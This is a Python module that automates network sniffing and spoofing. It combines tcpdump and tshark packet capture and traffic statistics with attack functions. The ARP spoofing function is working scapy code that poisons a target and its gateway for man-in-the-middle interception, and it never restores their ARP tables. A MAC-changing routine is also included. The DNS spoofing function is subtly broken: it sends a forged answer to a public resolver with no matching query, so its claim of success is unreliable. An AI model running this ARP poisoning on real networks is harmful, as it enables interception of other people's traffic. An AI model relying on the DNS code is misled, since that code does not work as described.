#!/usr/bin/env python3
"""
Sniffing & Spoofing Tools Category

This module provides automation for network sniffing and spoofing tools including:
- Packet capture and analysis
- ARP spoofing and poisoning
- DNS spoofing
- MAC address spoofing
- Traffic manipulation
- Network monitoring
"""

import asyncio
import json
import logging
import os
import time
from dataclasses import dataclass
from enum import Enum
from typing import Any

import scapy.all as scapy
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import ARP, Ether

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class SniffingType(Enum):
    """Types of sniffing activities."""
    PACKET_CAPTURE = "packet_capture"
    ARP_SPOOFING = "arp_spoofing"
    DNS_SPOOFING = "dns_spoofing"
    MAC_SPOOFING = "mac_spoofing"
    TRAFFIC_ANALYSIS = "traffic_analysis"
    NETWORK_MONITORING = "network_monitoring"


class ProtocolType(Enum):
    """Types of network protocols."""
    TCP = "tcp"
    UDP = "udp"
    ICMP = "icmp"
    HTTP = "http"
    HTTPS = "https"
    DNS = "dns"
    ARP = "arp"
    DHCP = "dhcp"


@dataclass
class PacketInfo:
    """Information about a captured packet."""
    timestamp: float
    source_ip: str
    destination_ip: str
    source_port: int
    destination_port: int
    protocol: str
    length: int
    payload: bytes
    flags: str = None


@dataclass
class SniffingResult:
    """Result of a sniffing activity."""
    activity_type: SniffingType
    target: str
    success: bool
    packets_captured: list[PacketInfo]
    statistics: dict[str, Any]
    timestamp: str
    duration: float
    output: str = None
    error: str = None


class SniffingSpoofingTools:
    """Main class for sniffing and spoofing tool automation."""

    def __init__(self, config: dict[str, Any] = None):
        """Initialize sniffing and spoofing tools."""
        self.config = config or {}
        self.output_dir = self.config.get('output_dir', '/tmp/sniffing_output')
        self.pcap_dir = os.path.join(self.output_dir, 'pcap')
        self.reports_dir = os.path.join(self.output_dir, 'reports')

        # Create output directories
        os.makedirs(self.output_dir, exist_ok=True)
        os.makedirs(self.pcap_dir, exist_ok=True)
        os.makedirs(self.reports_dir, exist_ok=True)

        # Tool paths
        self.tools = {
            'tcpdump': 'tcpdump',
            'tshark': 'tshark',
            'wireshark': 'wireshark',
            'ettercap': 'ettercap',
            'dsniff': 'dsniff',
            'arpspoof': 'arpspoof',
            'macchanger': 'macchanger',
            'ifconfig': 'ifconfig',
            'ip': 'ip',
            'iptables': 'iptables'
        }

        # Activity tracking
        self.activity_history: list[SniffingResult] = []
        self.captured_packets: list[PacketInfo] = []

        # Network interface
        self.interface = self.config.get('interface', 'eth0')

        logger.info("Sniffing and spoofing tools initialized")

    async def capture_packets(self, interface: str = None,
                             filter: str = None, duration: int = 60) -> SniffingResult:
        """Capture network packets using tcpdump."""
        try:
            if interface is None:
                interface = self.interface

            logger.info(f"Starting packet capture on {interface} for {duration} seconds")
            start_time = time.time()

            # Generate output filename
            timestamp = int(time.time())
            output_file = os.path.join(self.pcap_dir, f"capture_{interface}_{timestamp}.pcap")

            # Build tcpdump command
            cmd = [
                'tcpdump', '-i', interface, '-w', output_file,
                '-c', '10000'  # Capture up to 10,000 packets
            ]

            if filter:
                cmd.extend(['-f', filter])

            # Run capture in background
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            # Wait for specified duration
            await asyncio.sleep(duration)
            process.terminate()

            # Parse captured packets
            packets = await self._parse_pcap_file(output_file)

            # Generate statistics
            statistics = self._generate_packet_statistics(packets)

            duration_actual = time.time() - start_time

            result = SniffingResult(
                activity_type=SniffingType.PACKET_CAPTURE,
                target=interface,
                success=True,
                packets_captured=packets,
                statistics=statistics,
                timestamp=time.strftime('%Y-%m-%d %H:%M:%S'),
                duration=duration_actual,
                output=f"Captured {len(packets)} packets to {output_file}"
            )

            self.activity_history.append(result)
            self.captured_packets.extend(packets)

            logger.info(f"Packet capture completed: {len(packets)} packets captured")
            return result

        except Exception as e:
            logger.error(f"Error during packet capture: {e}")
            return SniffingResult(
                activity_type=SniffingType.PACKET_CAPTURE,
                target=interface or self.interface,
                success=False,
                packets_captured=[],
                statistics={},
                timestamp=time.strftime('%Y-%m-%d %H:%M:%S'),
                duration=0,
                error=str(e)
            )

    async def _parse_pcap_file(self, pcap_file: str) -> list[PacketInfo]:
        """Parse PCAP file to extract packet information."""
        packets = []

        try:
            # Use tshark to parse PCAP file
            cmd = [
                'tshark', '-r', pcap_file, '-T', 'json',
                '-e', 'frame.time_epoch',
                '-e', 'ip.src',
                '-e', 'ip.dst',
                '-e', 'tcp.srcport',
                '-e', 'tcp.dstport',
                '-e', 'udp.srcport',
                '-e', 'udp.dstport',
                '-e', 'frame.len',
                '-e', 'frame.protocols'
            ]

            result = await self._run_command(cmd)

            if result['success']:
                try:
                    data = json.loads(result['output'])
                    for packet_data in data:
                        if 'layers' in packet_data:
                            layers = packet_data['layers']

                            # Extract packet information
                            timestamp = float(layers.get('frame.time_epoch', [0])[0])
                            source_ip = layers.get('ip.src', [''])[0]
                            destination_ip = layers.get('ip.dst', [''])[0]

                            # Handle TCP/UDP ports
                            source_port = 0
                            destination_port = 0
                            if 'tcp.srcport' in layers:
                                source_port = int(layers['tcp.srcport'][0])
                                destination_port = int(layers['tcp.dstport'][0])
                                protocol = 'TCP'
                            elif 'udp.srcport' in layers:
                                source_port = int(layers['udp.srcport'][0])
                                destination_port = int(layers['udp.dstport'][0])
                                protocol = 'UDP'
                            else:
                                protocol = 'Other'

                            length = int(layers.get('frame.len', [0])[0])

                            packet_info = PacketInfo(
                                timestamp=timestamp,
                                source_ip=source_ip,
                                destination_ip=destination_ip,
                                source_port=source_port,
                                destination_port=destination_port,
                                protocol=protocol,
                                length=length,
                                payload=b''  # Raw payload not captured in this example
                            )
                            packets.append(packet_info)

                except json.JSONDecodeError as e:
                    logger.error(f"Error parsing tshark JSON output: {e}")

        except Exception as e:
            logger.error(f"Error parsing PCAP file: {e}")

        return packets

    def _generate_packet_statistics(self, packets: list[PacketInfo]) -> dict[str, Any]:
        """Generate statistics from captured packets."""
        statistics = {
            'total_packets': len(packets),
            'protocols': {},
            'top_sources': {},
            'top_destinations': {},
            'port_usage': {},
            'size_distribution': {
                'small': 0,    # 0-100 bytes
                'medium': 0,   # 101-1000 bytes
                'large': 0     # 1001+ bytes
            }
        }

        try:
            for packet in packets:
                # Protocol statistics
                protocol = packet.protocol
                statistics['protocols'][protocol] = statistics['protocols'].get(protocol, 0) + 1

                # Source IP statistics
                source_ip = packet.source_ip
                if source_ip:
                    statistics['top_sources'][source_ip] = statistics['top_sources'].get(source_ip, 0) + 1

                # Destination IP statistics
                destination_ip = packet.destination_ip
                if destination_ip:
                    statistics['top_destinations'][destination_ip] = statistics['top_destinations'].get(destination_ip, 0) + 1

                # Port usage statistics
                if packet.source_port > 0:
                    port = packet.source_port
                    statistics['port_usage'][port] = statistics['port_usage'].get(port, 0) + 1

                # Size distribution
                if packet.length <= 100:
                    statistics['size_distribution']['small'] += 1
                elif packet.length <= 1000:
                    statistics['size_distribution']['medium'] += 1
                else:
                    statistics['size_distribution']['large'] += 1

            # Sort top sources and destinations
            statistics['top_sources'] = dict(sorted(statistics['top_sources'].items(),
                                                  key=lambda x: x[1], reverse=True)[:10])
            statistics['top_destinations'] = dict(sorted(statistics['top_destinations'].items(),
                                                        key=lambda x: x[1], reverse=True)[:10])
            statistics['port_usage'] = dict(sorted(statistics['port_usage'].items(),
                                                  key=lambda x: x[1], reverse=True)[:10])

        except Exception as e:
            logger.error(f"Error generating packet statistics: {e}")

        return statistics

    async def perform_arp_spoofing(self, target_ip: str, gateway_ip: str,
                                   interface: str = None) -> SniffingResult:
        """Perform ARP spoofing attack."""
        try:
            if interface is None:
                interface = self.interface

            logger.info(f"Starting ARP spoofing attack: {target_ip} -> {gateway_ip}")
            start_time = time.time()

            # Get MAC addresses
            target_mac = await self._get_mac_address(target_ip)
            gateway_mac = await self._get_mac_address(gateway_ip)

            if not target_mac or not gateway_mac:
                raise Exception("Could not resolve MAC addresses")

            # Create ARP spoofing packets
            target_spoof = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
            gateway_spoof = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)

            # Send spoofed packets
            packets_sent = 0
            for i in range(10):  # Send 10 spoofed packets
                scapy.send(target_spoof, verbose=False)
                scapy.send(gateway_spoof, verbose=False)
                packets_sent += 2
                await asyncio.sleep(1)

            duration = time.time() - start_time

            result = SniffingResult(
                activity_type=SniffingType.ARP_SPOOFING,
                target=f"{target_ip} -> {gateway_ip}",
                success=True,
                packets_captured=[],
                statistics={
                    'packets_sent': packets_sent,
                    'target_ip': target_ip,
                    'gateway_ip': gateway_ip,
                    'target_mac': target_mac,
                    'gateway_mac': gateway_mac
                },
                timestamp=time.strftime('%Y-%m-%d %H:%M:%S'),
                duration=duration,
                output=f"ARP spoofing completed: {packets_sent} packets sent"
            )

            self.activity_history.append(result)
            return result

        except Exception as e:
            logger.error(f"Error during ARP spoofing: {e}")
            return SniffingResult(
                activity_type=SniffingType.ARP_SPOOFING,
                target=f"{target_ip} -> {gateway_ip}",
                success=False,
                packets_captured=[],
                statistics={},
                timestamp=time.strftime('%Y-%m-%d %H:%M:%S'),
                duration=0,
                error=str(e)
            )

    async def _get_mac_address(self, ip_address: str) -> str:
        """Get MAC address for an IP address using ARP."""
        try:
            # Send ARP request
            arp_request = ARP(pdst=ip_address)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast/arp_request

            # Send and receive
            answered_list = scapy.srp(arp_request_broadcast, timeout=3, verbose=False)[0]

            if answered_list:
                return answered_list[0][1].hwsrc

            return None

        except Exception as e:
            logger.error(f"Error getting MAC address for {ip_address}: {e}")
            return None

    async def perform_dns_spoofing(self, target_domain: str, spoofed_ip: str,
                                   interface: str = None) -> SniffingResult:
        """Perform DNS spoofing attack."""
        try:
            if interface is None:
                interface = self.interface

            logger.info(f"Starting DNS spoofing attack: {target_domain} -> {spoofed_ip}")
            start_time = time.time()

            # This is a simplified DNS spoofing implementation
            # In practice, you'd use tools like ettercap or dsniff

            # Create fake DNS response
            dns_spoof_packet = IP(dst="8.8.8.8")/UDP(dport=53)/scapy.DNS(
                qd=scapy.DNSQR(qname=target_domain),
                an=scapy.DNSRR(rrname=target_domain, rdata=spoofed_ip)
            )

            # Send spoofed packet
            scapy.send(dns_spoof_packet, verbose=False)

            duration = time.time() - start_time

            result = SniffingResult(
                activity_type=SniffingType.DNS_SPOOFING,
                target=target_domain,
                success=True,
                packets_captured=[],
                statistics={
                    'target_domain': target_domain,
                    'spoofed_ip': spoofed_ip,
                    'packets_sent': 1
                },
                timestamp=time.strftime('%Y-%m-%d %H:%M:%S'),
                duration=duration,
                output=f"DNS spoofing completed: {target_domain} -> {spoofed_ip}"
            )

            self.activity_history.append(result)
            return result

        except Exception as e:
            logger.error(f"Error during DNS spoofing: {e}")
            return SniffingResult(
                activity_type=SniffingType.DNS_SPOOFING,
                target=target_domain,
                success=False,
                packets_captured=[],
                statistics={},
                timestamp=time.strftime('%Y-%m-%d %H:%M:%S'),
                duration=0,
                error=str(e)
            )

    async def change_mac_address(self, interface: str = None,
                                new_mac: str = None) -> SniffingResult:
        """Change MAC address of network interface."""
        try:
            if interface is None:
                interface = self.interface

            if new_mac is None:
                # Generate random MAC address
                new_mac = self._generate_random_mac()

            logger.info(f"Changing MAC address on {interface} to {new_mac}")
            start_time = time.time()

            # Get current MAC address
            current_mac = await self._get_interface_mac(interface)

            # Change MAC address
            await self._run_command(['ifconfig', interface, 'down'])
            await self._run_command(['ifconfig', interface, 'hw', 'ether', new_mac])
            await self._run_command(['ifconfig', interface, 'up'])

            # Verify change
            new_mac_actual = await self._get_interface_mac(interface)

            duration = time.time() - start_time

            success = new_mac_actual == new_mac

            result = SniffingResult(
                activity_type=SniffingType.MAC_SPOOFING,
                target=interface,
                success=success,
                packets_captured=[],
                statistics={
                    'old_mac': current_mac,
                    'new_mac': new_mac,
                    'actual_mac': new_mac_actual
                },
                timestamp=time.strftime('%Y-%m-%d %H:%M:%S'),
                duration=duration,
                output=f"MAC address change {'completed' if success else 'failed'}"
            )

            self.activity_history.append(result)
            return result

        except Exception as e:
            logger.error(f"Error changing MAC address: {e}")
            return SniffingResult(
                activity_type=SniffingType.MAC_SPOOFING,
                target=interface or self.interface,
                success=False,
                packets_captured=[],
                statistics={},
                timestamp=time.strftime('%Y-%m-%d %H:%M:%S'),
                duration=0,
                error=str(e)
            )

    def _generate_random_mac(self) -> str:
        """Generate a random MAC address."""
        import random

        # Generate random MAC (locally administered, unicast)
        mac = [0x02, 0x00, 0x00]  # Locally administered, unicast
        mac.extend([random.randint(0x00, 0xff) for _ in range(3)])

        return ':'.join([f'{x:02x}' for x in mac])

    async def _get_interface_mac(self, interface: str) -> str:
        """Get MAC address of network interface."""
        try:
            result = await self._run_command(['ifconfig', interface])

            if result['success']:
                output = result['output']
                # Look for MAC address pattern
                import re
                mac_pattern = r'ether\s+([0-9a-fA-F:]{17})'
                match = re.search(mac_pattern, output)
                if match:
                    return match.group(1)

            return None

        except Exception as e:
            logger.error(f"Error getting interface MAC: {e}")
            return None

    async def analyze_traffic_patterns(self, pcap_file: str = None) -> SniffingResult:
        """Analyze traffic patterns from captured packets."""
        try:
            if pcap_file is None and self.captured_packets:
                packets = self.captured_packets
            elif pcap_file:
                packets = await self._parse_pcap_file(pcap_file)
            else:
                raise ValueError("No packets available for analysis")

            logger.info(f"Analyzing traffic patterns from {len(packets)} packets")
            start_time = time.time()

            # Perform traffic analysis
            analysis_results = await self._perform_traffic_analysis(packets)

            duration = time.time() - start_time

            result = SniffingResult(
                activity_type=SniffingType.TRAFFIC_ANALYSIS,
                target="traffic_analysis",
                success=True,
                packets_captured=packets,
                statistics=analysis_results,
                timestamp=time.strftime('%Y-%m-%d %H:%M:%S'),
                duration=duration,
                output=f"Traffic analysis completed: {len(analysis_results)} patterns identified"
            )

            self.activity_history.append(result)
            return result

        except Exception as e:
            logger.error(f"Error during traffic analysis: {e}")
            return SniffingResult(
                activity_type=SniffingType.TRAFFIC_ANALYSIS,
                target="traffic_analysis",
                success=False,
                packets_captured=[],
                statistics={},
                timestamp=time.strftime('%Y-%m-%d %H:%M:%S'),
                duration=0,
                error=str(e)
            )

    async def _perform_traffic_analysis(self, packets: list[PacketInfo]) -> dict[str, Any]:
        """Perform detailed traffic analysis."""
        analysis = {
            'connection_patterns': {},
            'protocol_analysis': {},
            'anomaly_detection': {},
            'bandwidth_usage': {},
            'peak_hours': {}
        }

        try:
            # Connection patterns
            connections = {}
            for packet in packets:
                if packet.source_ip and packet.destination_ip:
                    conn_key = f"{packet.source_ip}:{packet.source_port} -> {packet.destination_ip}:{packet.destination_port}"
                    if conn_key not in connections:
                        connections[conn_key] = {
                            'packets': 0,
                            'bytes': 0,
                            'first_seen': packet.timestamp,
                            'last_seen': packet.timestamp
                        }

                    connections[conn_key]['packets'] += 1
                    connections[conn_key]['bytes'] += packet.length
                    connections[conn_key]['last_seen'] = packet.timestamp

            analysis['connection_patterns'] = connections

            # Protocol analysis
            for packet in packets:
                protocol = packet.protocol
                if protocol not in analysis['protocol_analysis']:
                    analysis['protocol_analysis'][protocol] = {
                        'packet_count': 0,
                        'byte_count': 0,
                        'avg_packet_size': 0
                    }

                analysis['protocol_analysis'][protocol]['packet_count'] += 1
                analysis['protocol_analysis'][protocol]['byte_count'] += packet.length

            # Calculate averages
            for protocol, data in analysis['protocol_analysis'].items():
                if data['packet_count'] > 0:
                    data['avg_packet_size'] = data['byte_count'] / data['packet_count']

            # Anomaly detection
            analysis['anomaly_detection'] = self._detect_anomalies(packets)

            # Bandwidth usage over time
            analysis['bandwidth_usage'] = self._calculate_bandwidth_usage(packets)

            # Peak hours analysis
            analysis['peak_hours'] = self._analyze_peak_hours(packets)

        except Exception as e:
            logger.error(f"Error performing traffic analysis: {e}")

        return analysis

    def _detect_anomalies(self, packets: list[PacketInfo]) -> dict[str, Any]:
        """Detect anomalies in traffic patterns."""
        anomalies = {
            'large_packets': [],
            'unusual_ports': [],
            'rapid_connections': [],
            'suspicious_patterns': []
        }

        try:
            # Large packets
            for packet in packets:
                if packet.length > 1500:  # MTU threshold
                    anomalies['large_packets'].append({
                        'timestamp': packet.timestamp,
                        'size': packet.length,
                        'source': packet.source_ip,
                        'destination': packet.destination_ip
                    })

            # Unusual ports
            unusual_ports = [22, 23, 3389, 5900, 8080, 8443]  # Common but potentially suspicious
            for packet in packets:
                if packet.destination_port in unusual_ports:
                    anomalies['unusual_ports'].append({
                        'port': packet.destination_port,
                        'source': packet.source_ip,
                        'timestamp': packet.timestamp
                    })

            # Rapid connections (simplified)
            if len(packets) > 1000:  # High packet count
                anomalies['rapid_connections'].append({
                    'description': 'High packet volume detected',
                    'packet_count': len(packets),
                    'timeframe': 'capture_duration'
                })

        except Exception as e:
            logger.error(f"Error detecting anomalies: {e}")

        return anomalies

    def _calculate_bandwidth_usage(self, packets: list[PacketInfo]) -> dict[str, Any]:
        """Calculate bandwidth usage over time."""
        bandwidth = {
            'total_bytes': 0,
            'bytes_per_second': 0,
            'peak_bandwidth': 0
        }

        try:
            if packets:
                total_bytes = sum(packet.length for packet in packets)
                time_span = max(packet.timestamp for packet in packets) - min(packet.timestamp for packet in packets)

                bandwidth['total_bytes'] = total_bytes
                if time_span > 0:
                    bandwidth['bytes_per_second'] = total_bytes / time_span

                # Calculate peak bandwidth (simplified)
                bandwidth['peak_bandwidth'] = bandwidth['bytes_per_second'] * 1.5  # Estimate

        except Exception as e:
            logger.error(f"Error calculating bandwidth usage: {e}")

        return bandwidth

    def _analyze_peak_hours(self, packets: list[PacketInfo]) -> dict[str, Any]:
        """Analyze peak traffic hours."""
        hourly_stats = {}

        try:
            for packet in packets:
                # Convert timestamp to hour
                from datetime import datetime
                dt = datetime.fromtimestamp(packet.timestamp)
                hour = dt.hour

                if hour not in hourly_stats:
                    hourly_stats[hour] = {
                        'packet_count': 0,
                        'byte_count': 0
                    }

                hourly_stats[hour]['packet_count'] += 1
                hourly_stats[hour]['byte_count'] += packet.length

            # Find peak hours
            peak_hours = sorted(hourly_stats.items(), key=lambda x: x[1]['packet_count'], reverse=True)

        except Exception as e:
            logger.error(f"Error analyzing peak hours: {e}")

        return {
            'hourly_stats': hourly_stats,
            'peak_hours': peak_hours[:5] if 'peak_hours' in locals() else []
        }

    async def _run_command(self, cmd: list[str]) -> dict[str, Any]:
        """Run a command and return results."""
        try:
            logger.debug(f"Running command: {' '.join(cmd)}")

            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            stdout, stderr = await process.communicate()

            return {
                'success': process.returncode == 0,
                'output': stdout.decode('utf-8', errors='ignore'),
                'error': stderr.decode('utf-8', errors='ignore'),
                'return_code': process.returncode
            }

        except Exception as e:
            logger.error(f"Error running command {' '.join(cmd)}: {e}")
            return {
                'success': False,
                'output': '',
                'error': str(e),
                'return_code': -1
            }

    def get_activity_history(self) -> list[SniffingResult]:
        """Get activity history."""
        return self.activity_history

    def get_captured_packets(self) -> list[PacketInfo]:
        """Get all captured packets."""
        return self.captured_packets

    def cleanup(self):
        """Clean up resources."""
        try:
            # Clean up temporary files
            for activity in self.activity_history:
                if activity.activity_type == SniffingType.PACKET_CAPTURE:
                    # Clean up PCAP files
                    pass

            logger.info("Sniffing and spoofing tools cleanup completed")

        except Exception as e:
            logger.error(f"Error during cleanup: {e}")


# Example usage and testing
async def main():
    """Example usage of sniffing and spoofing tools."""
    tools = SniffingSpoofingTools()

    try:
        # Capture packets
        print("Starting packet capture...")
        capture_result = await tools.capture_packets(duration=10)
        print(f"Packet capture completed: {len(capture_result.packets_captured)} packets")

        # Analyze traffic patterns
        print("Analyzing traffic patterns...")
        analysis_result = await tools.analyze_traffic_patterns()
        print(f"Traffic analysis completed: {len(analysis_result.statistics)} analysis results")

        # Change MAC address (requires root privileges)
        print("Skipping MAC address change (requires root privileges)")

    finally:
        tools.cleanup()


if __name__ == "__main__":
    asyncio.run(main())
